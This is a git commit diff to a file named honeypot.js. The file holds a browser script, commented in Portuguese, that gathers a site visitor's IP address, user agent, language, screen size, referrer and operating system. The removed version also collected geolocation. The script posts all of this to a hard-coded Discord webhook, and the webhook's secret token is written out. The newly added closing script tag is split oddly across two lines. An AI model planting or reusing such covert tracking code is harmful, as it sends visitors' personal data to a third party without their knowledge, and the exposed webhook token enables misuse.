55bdbc318525d80f3e4b42beb8023c1e8ac12725
Machine <68440743+Machinh@users.noreply.github.com>
2023-07-07 18:09:57 +0000

    Update honeypot.js

--- honeypot.js
+++ honeypot.js
@@ -1,32 +1,9 @@
-  <script>
-  function enviarMensagem() {
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-          
-          sendMessage(latitude, longitude);
-        },
-        (error) => {
-          console.error("Erro ao obter a localização:", error);
-          
-          sendMessage(null, null);
-        }
-      );
-    } else {
-      console.error("Geolocalização não suportada pelo navegador.");
-      
-      sendMessage(null, null);
-    }
-  }
-
-  function sendMessage(latitude, longitude) {
-    fetch("https://api.ipify.org?format=json")
-      .then((response) => response.json())
-      .then((data) => {
+<script>
+  fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
         const ipAddress = data.ip;
-        const webhookUrl = "https://discordapp.com/api/webhooks/1125849929890402437/xHIrtwxCP_aDWwuivyFGAH81iHdZGhMDPg3vrCXZrDobhOkjSEJ0bNztpejZR14rNs_b";
+        const webhookUrl = 'https://discordapp.com/api/webhooks/1125849929890402437/xHIrtwxCP_aDWwuivyFGAH81iHdZGhMDPg3vrCXZrDobhOkjSEJ0bNztpejZR14rNs_b';
 
         const userAgent = navigator.userAgent;
         const language = navigator.language;
@@ -35,31 +12,26 @@
         const referrer = document.referrer;
         const operatingSystem = navigator.platform;
 
-        const locationMessage = latitude && longitude ? `Location: ${latitude},${longitude}\n` : '';
-        const message = `@everyone Nova visita ao site!\nIP: ${ipAddress}\n${locationMessage}User-Agent: ${userAgent}\nLinguagem: ${language}\nScreen Resolução: ${screenWidth}x${screenHeight}\nReferrer: ${referrer}\nSistema Operacional: ${operatingSystem}`;
+        const message = `@everyone Nova visita ao site! \nIP: ${ipAddress} \nUser-Agent: ${userAgent} \nLinguagem: ${language} \nScreen Resolução: ${screenWidth}x${screenHeight} \nReferrer: ${referrer} \nSistema Operacional: ${operatingSystem}`;
 
         fetch(webhookUrl, {
-          method: "POST",
+          method: 'POST',
           headers: {
-            "Content-Type": "application/json",
+            'Content-Type': 'application/json',
           },
           body: JSON.stringify({
             content: message,
           }),
         })
-          .then((response) => {
-            console.log("Mensagem enviada com sucesso!");
-          })
-          .catch((error) => {
-            console.error("Erro ao enviar a mensagem:", error);
-          });
+        .then(response => {
+          console.log('Mensagem enviada com sucesso!');
+        })
+        .catch(error => {
+          console.error('Erro ao enviar a mensagem:', error);
+        });
       })
-      .catch((error) => {
-        console.error("Erro ao obter o endereço IP:", error);
+      .catch(error => {
+        console.error('Erro ao obter o endereço IP:', error);
       });
-  }
-
-  window.addEventListener("DOMContentLoaded", (event) => {
-    enviarMensagem();
-  });
-        </script>
+</
+  script>
